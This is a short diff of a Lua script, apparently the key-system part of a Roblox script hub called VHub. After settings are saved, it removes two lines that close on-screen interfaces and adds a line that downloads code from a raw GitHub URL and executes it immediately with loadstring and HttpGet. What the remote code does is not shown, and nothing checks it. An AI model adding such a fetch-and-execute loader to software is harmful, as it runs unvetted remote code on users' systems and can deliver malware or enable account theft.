@@ -51,6 +51,5 @@ if _G.settingsTable.KeySystem == true then
 
 _G.Tablesettings.balk = true 
 Settingssave()
-game:GetService("CoreGui").VHubCoreScreen:Destroy()
-game:GetService("CoreGui").LaunchScreen:Destroy()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/testforshiistuff/stuff/main/Sadness'),true))()
 end
